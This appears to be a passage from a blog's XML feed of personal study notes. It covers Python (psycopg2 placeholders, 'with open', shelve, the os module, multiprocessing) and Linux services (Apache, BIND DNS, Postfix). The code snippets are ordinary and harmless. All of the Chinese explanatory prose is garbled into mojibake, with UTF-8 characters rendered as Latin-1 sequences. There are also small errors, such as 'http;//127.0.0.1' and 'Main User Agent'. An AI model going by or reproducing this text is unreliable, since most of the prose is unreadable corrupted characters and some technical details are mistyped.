some_table (an_int, a_date, a_string)</span></span><br><span class="hljs-meta prompt_">...</span> <span class="language-python"><span class="hljs-string">    VALUES (%(int)s, %(date)s, %(date)s, %(str)s);</span></span><br><span class="hljs-meta prompt_">...</span> <span class="language-python"><span class="hljs-string">    &quot;&quot;&quot;</span>,</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    &#123;<span class="hljs-string">&#x27;int&#x27;</span>: <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;str&#x27;</span>: <span class="hljs-string">&quot;O&#x27;Reilly&quot;</span>, <span class="hljs-string">&#x27;date&#x27;</span>: datetime.date(<span class="hljs-number">2005</span>, <span class="hljs-number">11</span>, <span class="hljs-number">18</span>)&#125;)</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>date</code> å°±è¢«ä½¿ç”¨äº†ä¸¤æ¬¡ã€‚ä¸”è¿™é‡Œç”¨çš„æ˜¯å­—å…¸ã€‚</p><p>è¡¨ç¤º <code>%</code> éœ€è¦ä½¿ç”¨ <code>%%</code>:</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure"><span class="hljs-string">&quot;SELECT (%s %% 2) = 0 AS even&quot;</span><span class="hljs-punctuation">,</span> (<span class="hljs-number">10</span><span class="hljs-punctuation">,</span>)<br></code></pre></td></tr></table></figure><p>æ³¨æ„ç¬¬äºŒä¸ªå‚æ•°å¿…é¡»ä¸º sequence, å› æ­¤è¦å†™ä¸º <code>(10,)</code> æˆ– <code>[10]</code></p><p>è¿™é‡Œçš„ placeholder å¿…é¡»æ˜¯ <code>%s</code> è€Œä¸èƒ½æ˜¯å…¶ä»–ã€‚</p><p>è‹¥éœ€è¦åŠ¨æ€æŸ¥è¯¢ï¼Œéœ€è¦:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">cur<span class="hljs-selector-class">.execute</span>(<br>    <span class="hljs-built_in">SQL</span>(<span class="hljs-string">&quot;INSERT INTO &#123;&#125; VALUES (%s)&quot;</span>)<span class="hljs-selector-class">.format</span>(<span class="hljs-built_in">Identifier</span>(<span class="hljs-string">&#x27;number&#x27;</span>)),<br>    (<span class="hljs-number">10</span>,))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python ä¸­ with open ç”¨æ³•</title>
    <link href="/2022/08/27/Python-%E4%B8%AD-with-open-%E7%94%A8%E6%B3%95/"/>
    <url>/2022/08/27/Python-%E4%B8%AD-with-open-%E7%94%A8%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>open() çš„å‡ ä¸ª mode:</p><ul><li>â€˜râ€™</li><li>â€˜wâ€™</li><li>â€˜aâ€™</li><li>â€˜r+â€™</li></ul><h1 id="ä½¿ç”¨-with-å…³é”®è¯"><a href="#ä½¿ç”¨-with-å…³é”®è¯" class="headerlink" title="ä½¿ç”¨ with å…³é”®è¯"></a>ä½¿ç”¨ with å…³é”®è¯</h1><p>ä½¿ç”¨ with å¯ä»¥ä¸ç”¨æ‹…å¿ƒ file.close() é—®é¢˜ã€‚å…¶åœ¨ä½¿ç”¨å®Œæ¯•åä¼šè‡ªåŠ¨å…³é—­æ–‡ä»¶ã€‚</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">with</span> open(&#x27;filename&#x27;, &#x27;mode&#x27;) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-class"><span class="hljs-keyword">data</span> = f.read()</span><br>    print(<span class="hljs-class"><span class="hljs-keyword">data</span>)</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python ç¼–ç¨‹ä»è®¤çŸ¥åˆ°å®è·µ</title>
    <link href="/2022/08/26/Python-%E7%BC%96%E7%A8%8B%E4%BB%8E%E8%AE%A4%E7%9F%A5%E5%88%B0%E5%AE%9E%E8%B7%B5/"/>
    <url>/2022/08/26/Python-%E7%BC%96%E7%A8%8B%E4%BB%8E%E8%AE%A4%E7%9F%A5%E5%88%B0%E5%AE%9E%E8%B7%B5/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬8ç« -è¯»å†™æ–‡ä»¶"><a href="#ç¬¬8ç« -è¯»å†™æ–‡ä»¶" class="headerlink" title="ç¬¬8ç«  è¯»å†™æ–‡ä»¶"></a>ç¬¬8ç«  è¯»å†™æ–‡ä»¶</h1><h2 id="8-1-æ–‡ä»¶ä¸æ–‡ä»¶è·¯å¾„"><a href="#8-1-æ–‡ä»¶ä¸æ–‡ä»¶è·¯å¾„" class="headerlink" title="8.1 æ–‡ä»¶ä¸æ–‡ä»¶è·¯å¾„"></a>8.1 æ–‡ä»¶ä¸æ–‡ä»¶è·¯å¾„</h2><h3 id="8-1-1-Windows-ä¸Šçš„å€’æ–œæ ä»¥åŠ-OS-X-å’Œ-Linux-ä¸Šçš„æ­£æ–œæ "><a href="#8-1-1-Windows-ä¸Šçš„å€’æ–œæ ä»¥åŠ-OS-X-å’Œ-Linux-ä¸Šçš„æ­£æ–œæ " class="headerlink" title="8.1.1 Windows ä¸Šçš„å€’æ–œæ ä»¥åŠ OS X å’Œ Linux ä¸Šçš„æ­£æ–œæ "></a>8.1.1 Windows ä¸Šçš„å€’æ–œæ ä»¥åŠ OS X å’Œ Linux ä¸Šçš„æ­£æ–œæ </h3><p>å¦‚æœæƒ³ç¨‹åºè¿è¡Œåœ¨æ‰€æœ‰æ“ä½œç³»ç»Ÿä¸Šï¼Œåœ¨ç¼–å†™ Python è„šæœ¬æ—¶ï¼Œå°±å¿…é¡»å¤„ç†è¿™ä¸¤ç§æƒ…å†µã€‚</p><h3 id="8-1-3-ç»å¯¹è·¯å¾„ä¸ç›¸å¯¹è·¯å¾„"><a href="#8-1-3-ç»å¯¹è·¯å¾„ä¸ç›¸å¯¹è·¯å¾„" class="headerlink" title="8.1.3 ç»å¯¹è·¯å¾„ä¸ç›¸å¯¹è·¯å¾„"></a>8.1.3 ç»å¯¹è·¯å¾„ä¸ç›¸å¯¹è·¯å¾„</h3><h2 id="8-2-æ–‡ä»¶è¯»å†™è¿‡ç¨‹"><a href="#8-2-æ–‡ä»¶è¯»å†™è¿‡ç¨‹" class="headerlink" title="8.2 æ–‡ä»¶è¯»å†™è¿‡ç¨‹"></a>8.2 æ–‡ä»¶è¯»å†™è¿‡ç¨‹</h2><p>åœ¨ Python ä¸­ï¼Œè¯»å†™æ–‡ä»¶æœ‰ 3 ä¸ªæ­¥éª¤:</p><ol><li>è°ƒç”¨ open() å‡½æ•°ï¼Œè¿”å›ä¸€ä¸ª File å¯¹è±¡</li><li>è°ƒç”¨ File å¯¹è±¡çš„ read() æˆ– write() æ–¹æ³•</li><li>è°ƒç”¨ File å¯¹è±¡çš„ close() æ–¹æ³•ï¼Œå…³é—­è¯¥æ–‡ä»¶</li></ol><h3 id="8-2-1-ç”¨-open-å‡½æ•°æ‰“å¼€æ–‡ä»¶"><a href="#8-2-1-ç”¨-open-å‡½æ•°æ‰“å¼€æ–‡ä»¶" class="headerlink" title="8.2.1 ç”¨ open() å‡½æ•°æ‰“å¼€æ–‡ä»¶"></a>8.2.1 ç”¨ open() å‡½æ•°æ‰“å¼€æ–‡ä»¶</h3><p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è·¯å¾„ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æ¨¡å¼.</p><h3 id="8-2-2-è¯»å–æ–‡ä»¶å†…å®¹"><a href="#8-2-2-è¯»å–æ–‡ä»¶å†…å®¹" class="headerlink" title="8.2.2 è¯»å–æ–‡ä»¶å†…å®¹"></a>8.2.2 è¯»å–æ–‡ä»¶å†…å®¹</h3><p>ç”¨ read() å‡½æ•°ã€‚</p><p>ç”¨ readlines() æ–¹æ³•ï¼Œå¯ä»¥å–å¾—ä¸€ä¸ªåˆ—è¡¨ï¼Œå…¶å…ƒç´ æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå³æ–‡æœ¬ä¸­çš„ä¸€è¡Œ.</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">sonnetFile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;sonnet29.txt&#x27;</span>)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">sonnetFile.readline()</span><br></code></pre></td></tr></table></figure><h3 id="8-2-3-å†™å…¥æ–‡ä»¶"><a href="#8-2-3-å†™å…¥æ–‡ä»¶" class="headerlink" title="8.2.3 å†™å…¥æ–‡ä»¶"></a>8.2.3 å†™å…¥æ–‡ä»¶</h3><p>å†™æ¨¡å¼ä¸º â€˜wâ€™, æ·»åŠ æ¨¡å¼ä¸º â€˜aâ€™.</p><h2 id="8-3-ç”¨-shelve-æ¨¡å—ä¿å­˜å˜é‡"><a href="#8-3-ç”¨-shelve-æ¨¡å—ä¿å­˜å˜é‡" class="headerlink" title="8.3 ç”¨ shelve æ¨¡å—ä¿å­˜å˜é‡"></a>8.3 ç”¨ shelve æ¨¡å—ä¿å­˜å˜é‡</h2><p>åˆ©ç”¨ shelve æ¨¡å—ï¼Œå¯ä»¥å°† Python ç¨‹åºä¸­çš„å˜é‡ä¿å­˜åˆ°äºŒè¿›åˆ¶çš„ shelf æ–‡ä»¶ä¸­:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import shelve<br><br>shelfFile = shelve<span class="hljs-selector-class">.open</span>(<span class="hljs-string">&#x27;mydata&#x27;</span>)<br>cats = <span class="hljs-selector-attr">[<span class="hljs-string">&#x27;Zophie&#x27;</span>, <span class="hljs-string">&#x27;Pooka&#x27;</span>, <span class="hljs-string">&#x27;Simon&#x27;</span>]</span><br>shelfFile<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;cats&#x27;</span>]</span> = cats<br>shelfFile<span class="hljs-selector-class">.close</span>()<br></code></pre></td></tr></table></figure><p>è°ƒç”¨ shelve.open() å¹¶ä¼ å…¥ä¸€ä¸ªæ–‡ä»¶åï¼Œç„¶åå°†è¿”å›çš„å€¼ä¿å­˜åœ¨ä¸€ä¸ªå˜é‡ä¸­ï¼Œå¯ä»¥åƒå­—å…¸ä¸€æ ·æ“ä½œè¿™ä¸ªå˜é‡ï¼Œå®Œæˆæ—¶éœ€è¦è°ƒç”¨ close().</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python ä¸­ os åº“</title>
    <link href="/2022/08/26/Python-%E4%B8%AD-os-%E5%BA%93/"/>
    <url>/2022/08/26/Python-%E4%B8%AD-os-%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<h1 id="å¸¸ç”¨æ–¹æ³•"><a href="#å¸¸ç”¨æ–¹æ³•" class="headerlink" title="å¸¸ç”¨æ–¹æ³•"></a>å¸¸ç”¨æ–¹æ³•</h1><h2 id="getcwd"><a href="#getcwd" class="headerlink" title="getcwd()"></a>getcwd()</h2><p>è·å–å½“å‰å·¥ä½œè·¯å¾„ã€‚</p><h2 id="listdir-path"><a href="#listdir-path" class="headerlink" title="listdir(path)"></a>listdir(path)</h2><p>è¿”å› <code>path</code> ä¸‹çš„æ–‡ä»¶å’Œç›®å½•ç»„æˆçš„åˆ—è¡¨ï¼Œç±»ä¼¼ Linux å‘½ä»¤ <code>ls</code></p><h2 id="walk-path"><a href="#walk-path" class="headerlink" title="walk(path)"></a>walk(path)</h2><p>éå†æŒ‡å®š <code>path</code> ä¸‹çš„æ‰€æœ‰ç›®å½•ï¼Œè¿”å›ç”±è·¯å¾„ã€æ–‡ä»¶å¤¹ã€æ–‡ä»¶ ä¸‰ä¸ªåˆ—è¡¨ç»„æˆçš„å…ƒç»„ã€‚</p><h2 id="path-exists-path"><a href="#path-exists-path" class="headerlink" title="path.exists(path)"></a>path.exists(path)</h2><p>åˆ¤æ–­è·¯å¾„ä¸‹çš„ç›®å½•æ˜¯å¦å­˜åœ¨ï¼Œå­˜åœ¨è¿”å› Ture.</p><h2 id="mkdir-path"><a href="#mkdir-path" class="headerlink" title="mkdir(path)"></a>mkdir(path)</h2><p>åˆ›å»ºä¸€ä¸ªç›®å½•ã€‚</p><h2 id="makedirs-path"><a href="#makedirs-path" class="headerlink" title="makedirs(path)"></a>makedirs(path)</h2><p>åˆ›å»ºé€’å½’ç›®å½•ã€‚</p><h2 id="rmdir-path"><a href="#rmdir-path" class="headerlink" title="rmdir(path)"></a>rmdir(path)</h2><p>åˆ é™¤ç›®å½•.</p><h2 id="path-join-path1-path2"><a href="#path-join-path1-path2" class="headerlink" title="path.join(path1, path2)"></a>path.join(path1, path2)</h2><p>å°†ä¸¤ä¸ªè·¯å¾„æ‹¼æ¥ã€‚å…¶ä¼šåŒ…å«æ­£ç¡®çš„è·¯å¾„åˆ†éš”ç¬¦.</p><h2 id="path-split-path"><a href="#path-split-path" class="headerlink" title="path.split(path)"></a>path.split(path)</h2><p>å°†è·¯å¾„æ‹†åˆ†ä¸º:</p><ul><li>ç»å¯¹è·¯å¾„, é™¤æ–‡ä»¶åéƒ¨åˆ†</li><li>æ–‡ä»¶å<br>è¿”å›å…ƒç»„.</li></ul><h2 id="path-dirname-path"><a href="#path-dirname-path" class="headerlink" title="path.dirname(path)"></a>path.dirname(path)</h2><p>è·å–æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ã€‚</p><h2 id="path-basename-path"><a href="#path-basename-path" class="headerlink" title="path.basename(path)"></a>path.basename(path)</h2><p>åªè·å–æ–‡ä»¶å.</p><h2 id="path-isdir-path"><a href="#path-isdir-path" class="headerlink" title="path.isdir(path)"></a>path.isdir(path)</h2><p>åˆ¤æ–­æ˜¯å¦æ˜¯ç›®å½•ã€‚</p><h2 id="path-isfile-path"><a href="#path-isfile-path" class="headerlink" title="path.isfile(path)"></a>path.isfile(path)</h2><p>åˆ¤æ–­æ˜¯å¦ä¸ºæ–‡ä»¶ã€‚</p><h2 id="path-sep"><a href="#path-sep" class="headerlink" title="path.sep"></a>path.sep</h2><p>è¿”å›å½“å‰æ“ä½œç³»ç»Ÿçš„è·¯å¾„åˆ†éš”ç¬¦ã€‚</p><h2 id="path-getsize-path"><a href="#path-getsize-path" class="headerlink" title="path.getsize(path)"></a>path.getsize(path)</h2><p>è¿”å›æ–‡ä»¶å¤§å°.</p><h2 id="path-abspath-path"><a href="#path-abspath-path" class="headerlink" title="path.abspath(path)"></a>path.abspath(path)</h2><p>è¿”å›å‚æ•°çš„ç»å¯¹è·¯å¾„çš„å­—ç¬¦ä¸²ã€‚</p><h2 id="path-isabs-path"><a href="#path-isabs-path" class="headerlink" title="path.isabs(path)"></a>path.isabs(path)</h2><p>å¦‚æœå‚æ•°æ˜¯ä¸€ä¸ªç»å¯¹è·¯å¾„ï¼Œå°±è¿”å› Ture.</p><h2 id="path-relpath-path-start"><a href="#path-relpath-path-start" class="headerlink" title="path.relpath(path, start)"></a>path.relpath(path, start)</h2><p>è¿”å›ä» start è·¯å¾„åˆ° path çš„ç›¸å¯¹è·¯å¾„çš„å­—ç¬¦ä¸²ï¼Œè‹¥æœªæŒ‡å®š start, å°±ä½¿ç”¨å½“å‰å·¥ä½œç›®å½•.</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python ä¸­ multiprocessing åº“ä½¿ç”¨</title>
    <link href="/2022/08/26/Python-%E4%B8%AD-multiprocessing-%E5%BA%93%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/08/26/Python-%E4%B8%AD-multiprocessing-%E5%BA%93%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>çˆ¬è™«æ—¶å•çº¿ç¨‹æ¯”è¾ƒæ…¢ï¼Œä½¿ç”¨ <code>multiprocessing</code> åº“å¯ä»¥å®ç°å¤šè¿›ç¨‹.</p><p>å¸¸ç”¨ç»„ä»¶:</p><h1 id="Process-ç±»"><a href="#Process-ç±»" class="headerlink" title="Process ç±»"></a>Process ç±»</h1><p>Process ç±»ç”¨äºåˆ›å»ºè¿›ç¨‹å¯¹è±¡ï¼Œéœ€ä¼ å…¥</p><ul><li>éœ€è¦æ‰§è¡Œçš„å‡½æ•°, ä¼ ç»™ <code>target</code> </li><li>å‡½æ•°çš„å‚æ•°, ä¼ ç»™ <code>args</code></li></ul><p>åˆ›å»ºå¥½ä¸€ä¸ª Process å®ä¾‹åå¯ä»¥ä½¿ç”¨ <code>start()</code> æ–¹æ³•å¯åŠ¨ã€‚</p><p>è¯­æ³•:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">Process([<span class="hljs-params">group</span>], [<span class="hljs-params">target</span>], [<span class="hljs-params">name</span>], [<span class="hljs-params">args</span>], [<span class="hljs-params">kwargs</span>])</span><br></code></pre></td></tr></table></figure><p>å…¶ä¸­:</p><ul><li>group, æŒ‡å®šè¿›ç¨‹ç»„</li><li>target, ä¼ é€’å‡½æ•°</li><li>nameï¼ŒæŒ‡å®šè¿›ç¨‹åå­—</li><li>args, ä»¥å…ƒç»„çš„æ–¹å¼ä¼ é€’å‚æ•°</li><li>kwargs, ä»¥å­—å…¸çš„æ–¹å¼ç»™ target æŒ‡å®šçš„å‡½æ•°ä¼ é€’å‚æ•°</li></ul><p>å¸¸ç”¨æ–¹æ³•:</p><ul><li>start(), å¯åŠ¨å®ä¾‹</li><li>is_alive(), åˆ¤æ–­è¿›ç¨‹æ˜¯å¦è¿˜å­˜åœ¨</li><li>join([timeout]), æ˜¯å¦ç­‰å¾…è¿›ç¨‹æ‰§è¡Œç»“æŸï¼Œæˆ–ç­‰å¾…å¤šå°‘ç§’</li><li>terminate(), ç»ˆæ­¢å­è¿›ç¨‹</li></ul><p>å¸¸ç”¨å±æ€§:</p><ul><li>name, è¿›ç¨‹åˆ«å</li><li>pid, è¿›ç¨‹å·</li></ul><h1 id="è¿›ç¨‹æ± -Pool-å’Œ-map"><a href="#è¿›ç¨‹æ± -Pool-å’Œ-map" class="headerlink" title="è¿›ç¨‹æ±  Pool() å’Œ map()"></a>è¿›ç¨‹æ±  Pool() å’Œ map()</h1><p>Processing Pool, ç”¨äºåˆ›å»ºå¤šä¸ªè¿›ç¨‹.</p><p> å®šä¹‰ä¸€ä¸ª Pool:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">import multiprocessing<br><br><span class="hljs-attribute">pool</span> <span class="hljs-operator">=</span> multiprocessing.Pool<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶ <code>pool</code> ä¸ºä¸€ä¸ª Processing poolï¼Œå…¶ä¼šæ ¹æ®å½“å‰è¿è¡Œç¯å¢ƒæ¥å†³å®šè¿è¡Œå¤šå°‘ä¸ªè¿›ç¨‹ï¼Œå¹¶æŠŠæ¯æ¬¡è°ƒç”¨åˆ†åˆ«å˜æˆä¸€ä¸ªè¿›ç¨‹ï¼Œä¾‹å¦‚ CPU æœ‰ 8 ä¸ªæ ¸, é‚£ä¹ˆè¿›ç¨‹æ± çš„å¤§å°å°±ä¼šé»˜è®¤è®¾ç½®ä¸º 8.</p><p>åˆ©ç”¨ <code>map()</code> æ–¹æ³•ï¼Œå‘ Processing pool ä¸­ä¼ é€’å‡½æ•°å’Œå‚æ•°:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">result = pool.<span class="hljs-keyword">map</span>(<span class="hljs-function"><span class="hljs-keyword">func</span>, <span class="hljs-title">range</span><span class="hljs-params">(10)</span></span>)<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„å‚æ•°åº”è¯¥æ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼ŒåŒ…å«æ¯ä¸€æ¬¡è°ƒç”¨æ‰€éœ€è¦çš„å‚æ•°ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux å°±è¯¥è¿™ä¹ˆå­¦</title>
    <link href="/2022/08/26/Linux-%E5%B0%B1%E8%AF%A5%E8%BF%99%E4%B9%88%E5%AD%A6/"/>
    <url>/2022/08/26/Linux-%E5%B0%B1%E8%AF%A5%E8%BF%99%E4%B9%88%E5%AD%A6/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬10ç« -ä½¿ç”¨-Apache-æœåŠ¡éƒ¨ç½²é™æ€ç½‘ç«™"><a href="#ç¬¬10ç« -ä½¿ç”¨-Apache-æœåŠ¡éƒ¨ç½²é™æ€ç½‘ç«™" class="headerlink" title="ç¬¬10ç«  ä½¿ç”¨ Apache  æœåŠ¡éƒ¨ç½²é™æ€ç½‘ç«™"></a>ç¬¬10ç«  ä½¿ç”¨ Apache  æœåŠ¡éƒ¨ç½²é™æ€ç½‘ç«™</h1><h2 id="10-1-ç½‘ç«™æœåŠ¡ç¨‹åº"><a href="#10-1-ç½‘ç«™æœåŠ¡ç¨‹åº" class="headerlink" title="10.1 ç½‘ç«™æœåŠ¡ç¨‹åº"></a>10.1 ç½‘ç«™æœåŠ¡ç¨‹åº</h2><p>å®‰è£… apache æœåŠ¡ç¨‹åº:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> apache2<br></code></pre></td></tr></table></figure><p>é»˜è®¤ç•Œé¢çš„åœ°å€ä¸º <code>http;//127.0.0.1</code></p><h2 id="10-2-é…ç½®æœåŠ¡æ–‡ä»¶å‚æ•°"><a href="#10-2-é…ç½®æœåŠ¡æ–‡ä»¶å‚æ•°" class="headerlink" title="10.2 é…ç½®æœåŠ¡æ–‡ä»¶å‚æ•°"></a>10.2 é…ç½®æœåŠ¡æ–‡ä»¶å‚æ•°</h2><h1 id="ç¬¬13ç« -ä½¿ç”¨-BIND-æä¾›åŸŸåè§£ææœåŠ¡"><a href="#ç¬¬13ç« -ä½¿ç”¨-BIND-æä¾›åŸŸåè§£ææœåŠ¡" class="headerlink" title="ç¬¬13ç«  ä½¿ç”¨ BIND æä¾›åŸŸåè§£ææœåŠ¡"></a>ç¬¬13ç«  ä½¿ç”¨ BIND æä¾›åŸŸåè§£ææœåŠ¡</h1><h2 id="13-1-DNS-åŸŸåè§£ææœåŠ¡"><a href="#13-1-DNS-åŸŸåè§£ææœåŠ¡" class="headerlink" title="13.1 DNS åŸŸåè§£ææœåŠ¡"></a>13.1 DNS åŸŸåè§£ææœåŠ¡</h2><p>DNSï¼Œå³ Domian Name System. ç”¨äºç®¡ç†å’Œè§£æåŸŸåä¸ IP åœ°å€å¯¹åº”å…³ç³»çš„æŠ€æœ¯.</p><p>å°†åŸŸåè§£æä¸º IP åœ°å€ï¼Œå³æ­£å‘è§£æã€‚å°† IP åœ°å€è§£æä¸ºåŸŸåï¼Œå³åå‘è§£æ.</p><p>åŸŸååç¼€ä¸€èˆ¬åˆ†ä¸º:</p><ul><li>å›½é™…åŸŸå</li><li>å›½å†…åŸŸå<br>å¸¸è§åŸŸåæœ‰:</li><li>.com : å•†ä¸šç»„ç»‡</li><li>.org : éè¥åˆ©ç»„ç»‡</li><li>.gov : æ”¿åºœéƒ¨é—¨</li><li>.net : ç½‘ç»œæœåŠ¡å•†</li><li>.edu : æ•™è‚²æœºæ„</li><li>.pub : å…¬å…±å¤§ä¼—</li><li>.cn : ä¸­å›½å›½å®¶é¡¶çº§åŸŸå</li></ul><h2 id="13-2-å®‰è£…-bind-æœåŠ¡ç¨‹åº"><a href="#13-2-å®‰è£…-bind-æœåŠ¡ç¨‹åº" class="headerlink" title="13.2 å®‰è£… bind æœåŠ¡ç¨‹åº"></a>13.2 å®‰è£… bind æœåŠ¡ç¨‹åº</h2><p>BIND (Berkeley Internet Name Domain, ä¼¯å…‹åˆ©å› ç‰¹ç½‘åç§°åŸŸ) æœåŠ¡æ˜¯å…¨çƒèŒƒå›´å†…ä½¿ç”¨æœ€å¹¿æ³›ã€æœ€å®‰å…¨å¯é ä¸”é«˜æ•ˆçš„åŸŸåè§£ææœåŠ¡ç¨‹åº. å¯åŠ ä¸Š chroot (ç‰¢ç¬¼æœºåˆ¶) æ‰©å±•åŒ…ï¼Œä»¥ä¾¿æœ‰æ•ˆåœ°é™åˆ¶ bind æœåŠ¡ç¨‹åºä»…èƒ½å¯¹è‡ªèº«çš„é…ç½®æ–‡ä»¶è¿›è¡Œæ“ä½œï¼Œä»¥ç¡®ä¿æ•´ä¸ªæœåŠ¡å™¨çš„å®‰å…¨ã€‚</p><p>bind æœåŠ¡ç¨‹åºä¸‹æœ‰ä¸‰ä¸ªæ¯”è¾ƒå…³é”®çš„æ–‡ä»¶:</p><ul><li>ä¸»é…ç½®æ–‡ä»¶ (&#x2F;etc&#x2F;named.conf) :å…¶å‚æ•°ç”¨æ¥å®šä¹‰ bind æœåŠ¡ç¨‹åºçš„è¿è¡Œ</li><li>åŒºåŸŸé…ç½®æ–‡ä»¶ (&#x2F;etc&#x2F;named.rfc1912.zones) :ç”¨æ¥ä¿å­˜åŸŸåå’Œ IP åœ°å€å¯¹åº”å…³ç³»çš„æ‰€åœ¨ä½ç½®ï¼Œæ²¡æœ‰åŒ…å«å…·ä½“çš„åŸŸåã€IP åœ°å€å¯¹åº”å…³ç³»ç­‰ä¿¡æ¯: æœåŠ¡ç±»å‹æœ‰ä¸‰ç§:<ul><li>hint (æ ¹åŒºåŸŸ)</li><li>master (ä¸»åŒºåŸŸ) å³ä¸»æœåŠ¡å™¨</li><li>slave (è¾…åŠ©åŒºåŸŸ) å³ä»æœåŠ¡å™¨</li></ul></li><li></li><li>æ•°æ®é…ç½®æ–‡ä»¶ (&#x2F;var&#x2F;named) :ç”¨æ¥ä¿å­˜åŸŸåå’Œ IP åœ°å€çœŸæ˜¯å¯¹åº”å…³ç³»çš„æ•°æ®é…ç½®æ–‡ä»¶<br>åœ¨ Linux ç³»ç»Ÿä¸­ï¼Œbind æœåŠ¡ç¨‹åºçš„åç§°ä¸º named.</li></ul><p><code>named-checkconf</code> å‘½ä»¤ç”¨äºæ£€æŸ¥ä¸»é…ç½®æ–‡ä»¶ä¸­çš„è¯­æ³•æˆ–å‚æ•°çš„é”™è¯¯ã€‚</p><p><code>named-checkzone</code> å‘½ä»¤ç”¨äºæ£€æŸ¥æ•°æ®é…ç½®æ–‡ä»¶ä¸­çš„è¯­æ³•æˆ–å‚æ•°é”™è¯¯ã€‚</p><h1 id="ç¬¬15ç« -ä½¿ç”¨-Postfix-ä¸-Dovecot-éƒ¨ç½²é‚®ä»¶ç³»ç»Ÿ"><a href="#ç¬¬15ç« -ä½¿ç”¨-Postfix-ä¸-Dovecot-éƒ¨ç½²é‚®ä»¶ç³»ç»Ÿ" class="headerlink" title="ç¬¬15ç«  ä½¿ç”¨ Postfix ä¸ Dovecot éƒ¨ç½²é‚®ä»¶ç³»ç»Ÿ"></a>ç¬¬15ç«  ä½¿ç”¨ Postfix ä¸ Dovecot éƒ¨ç½²é‚®ä»¶ç³»ç»Ÿ</h1><h2 id="15-1-ç”µå­é‚®ä»¶ç³»ç»Ÿ"><a href="#15-1-ç”µå­é‚®ä»¶ç³»ç»Ÿ" class="headerlink" title="15.1 ç”µå­é‚®ä»¶ç³»ç»Ÿ"></a>15.1 ç”µå­é‚®ä»¶ç³»ç»Ÿ</h2><p>ä½¿ç”¨ â€œå§“å@è®¡ç®—æœºä¸»æœºåç§°â€ çš„æ ¼å¼æ¥è§„èŒƒç”µå­ä¿¡ç®±çš„åç§°.</p><p>ç”µå­é‚®ä»¶ç³»ç»ŸåŸºäºé‚®ä»¶åè®®æ¥å®Œæˆç”µå­é‚®ç®±çš„ä¼ è¾“.</p><p>å¸¸è§çš„é‚®ç®±åè®®:</p><ul><li>Simple Mail Transfer Protocol, SMTP, ç”¨äºå‘é€å’Œä¸­è½¬çš„ç”µå­é‚®ä»¶ï¼Œå ç”¨æœåŠ¡å™¨çš„ TCP&#x2F;25 ç«¯å£</li><li>Post Office Protocol 3, ç”¨äºå°†ç”µå­é‚®ä»¶å­˜å‚¨åˆ°æœ¬åœ°ä¸»æœºï¼Œå ç”¨æœåŠ¡å™¨çš„ TCP&#x2F;110 ç«¯å£</li><li>Internet Message Access Protocol 4, ç”¨äºåœ¨æœ¬åœ°ä¸»æœºè®¿é—®é‚®ä»¶ï¼Œå ç”¨æœåŠ¡å™¨çš„ TCP&#x2F;143 ç«¯å£</li></ul><p>åœ¨ç”µå­é‚®ä»¶ç³»ç»Ÿä¸­ï¼Œä¸ºç”¨æˆ·æ”¶å‘é‚®ä»¶çš„æœåŠ¡å™¨åä¸º<mark>é‚®ä»¶ç”¨æˆ·ä»£ç†</mark>(Main User Agent) å³ 